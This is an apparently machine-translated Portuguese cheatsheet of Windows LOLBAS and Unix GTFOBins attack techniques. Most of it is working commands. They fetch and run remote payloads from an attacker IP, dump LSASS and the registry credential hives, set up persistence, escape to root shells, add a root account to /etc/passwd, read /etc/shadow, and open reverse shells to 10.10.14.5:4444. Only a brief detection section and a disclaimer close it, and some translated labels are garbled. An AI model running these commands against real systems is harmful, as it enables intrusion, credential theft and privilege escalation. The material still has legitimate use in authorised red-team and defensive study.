<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Vivendo da terra (LOLBAS e GTFOBins) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Evasão de Defesa">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Viver da terra">
</p>

<p alinhar="centro">
  <b>🛠️ Referência abrangente sobre como abusar de binários de sistema pré-instalados legítimos para executar código, baixar cargas e aumentar privilégios</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Por que viver da terra?](#-porque-viver-da-terra)
- [Parte 1: Windows LOLBAS](#-part-1-windows-lolbas)
  - [Download e entrada de arquivo](#download de arquivo--ingress)
  - [Execução de código e desvio de AppLocker](#code-execution--applocker-bypass)
  - [Despejo de credenciais (LSASS, SAM, LSA)](#dumping de credenciais-lsass-sam-lsa)
  - [Reconhecimento e Descoberta](#reconhecimento--descoberta)
  - [Persistência e tarefas agendadas](#persistence--scheduled-tasks)
- [Parte 2: Unix / Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID & Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [Exploração de leitura e gravação de arquivo](#file-read--write-exploitation)
  - [Entrada de rede e shells reversos](#network-ingress--reverse-shells)
  - [Intérpretes de alto impacto GTFOBins](#gtfobins-high-impact-interpreters)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**Living Off The Land (LotL)** é uma arte pós-exploração em que invasores e red teamers usam exclusivamente binários de sistema, scripts e bibliotecas legítimos, integrados e confiáveis ​​já presentes no sistema operacional.

- **LOLBAS (Windows):** Living Off The Land Binários, scripts e bibliotecas.
- **GTFOBins (Unix/Linux):** Coleção selecionada de binários Unix que podem ser usados ​​de forma abusiva para contornar restrições de segurança locais, escapar de shells restritos e aumentar privilégios.

---

## ⚖️Por que viver da terra?

1. 🛡️ **Ignora a lista de permissões de aplicativos:** Binários como `certutil.exe`, `rundll32.exe` ou `find` são assinados digitalmente pela Microsoft ou fornecedores de sistema operacional e são confiáveis ​​por AppLocker, WDAC e SELinux.
2. 👁️ **Evita AV/EDR baseado em assinatura:** Nenhum executável malicioso estrangeiro (`.exe`, `.elf`) é colocado no disco.
3. 📉 **Baixa pegada operacional:** Reduz anomalias forenses de registro utilizando ferramentas de administração nativas.

---

## 🪟 Parte 1: Windows LOLBAS

### Download e entrada de arquivos

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2.Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe e PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Execução de código e desvio de AppLocker

#### 1. Mshta.exe (executar HTA/VBScript remoto)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (técnica Squablydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (execução de script XSL)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Dumping de credenciais (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (despejo LSASS)
Descarte a memória do processo LSASS sem descartar o Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (salvar seções SAM, SYSTEM e SECURITY)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Reconhecimento e Descoberta
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Persistência e tarefas agendadas
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Parte 2: GTFOBins Unix/Linux

### SUID e Sudo Shell Escapes

Quando um binário tem SUID definido (`chmod u+s`) ou é concedido em `sudo -l`, abuse dele para obter um shell root imediato:

#### 1. Sudo/SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo/SUID `vim`/`vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo/SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo/SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo/SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo/SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Exploração de leitura e gravação de arquivos

Quando você não conseguir gerar um shell diretamente, use utilitários de leitura/gravação de arquivo para substituir `/etc/passwd` ou ler `/etc/shadow`:

#### Substituir `/etc/passwd` via Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Leia arquivos confidenciais por meio de binários SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Entrada de rede e shells reversos

Transfira arquivos e pop shells sem `curl` ou `wget`:

#### 1. Shell reverso TCP nativo do Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Netcat nativo (sem sinalizador `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. Shell reverso criptografado OpenSSL
No atacante:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
No alvo:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### Intérpretes de alto impacto GTFOBins

Se os intérpretes receberem Sudo/SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Tabela de referência rápida

| SO | Binário | Finalidade | Comando de Abuso |
|----|--------|---------|-----------|
| **Ganhe** | `certutil.exe` | Baixar arquivo | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Ganhe** | `mshta.exe` | Executivo de HTA Remoto | `mshta http://<IP>/payload.hta` |
| **Ganhe** | `regsvr32.exe` | ScriptletExec | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Ganhe** | `rundll32.exe` | Despejo LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | Concha SUID | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Concha | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Fuga da Concha | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Sobrescrever arquivo | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Considerações defensivas e detecção

1. **Registro de linha de comando de auditoria:**
   Habilite **Sysmon (Event ID 1)** e Windows Process Creation Logging (Event ID 4688) com auditoria de linha de comando para monitorar argumentos anômalos passados para `certutil`, `mshta` e `rundll32`.
2. **Bloquear relacionamentos maliciosos entre pais e filhos:**
   Monitore `mshta.exe` ou `regsvr32.exe` gerando `cmd.exe` ou `powershell.exe`.
3. **Restringir Diretivas Sudo:**
   Evite curingas (`*`) em `/etc/sudoers`. Nunca permita que usuários executem editores de texto (`vim`, `nano`) ou compiladores como root.

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** As técnicas de Living Off The Land abusam de serviços administrativos confiáveis. Esta folha de dicas é estritamente para avaliações de segurança autorizadas, fortalecimento defensivo e estudo educacional.

---

## 📚 Recursos

- [Repositório Oficial do Projeto LOLBAS](https://lolbas-project.github.io/)
- [Repositório Oficial GTFOBins](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subvertendo os controles de confiança (T1564)](https://attack.mitre.org/techniques/T1564/)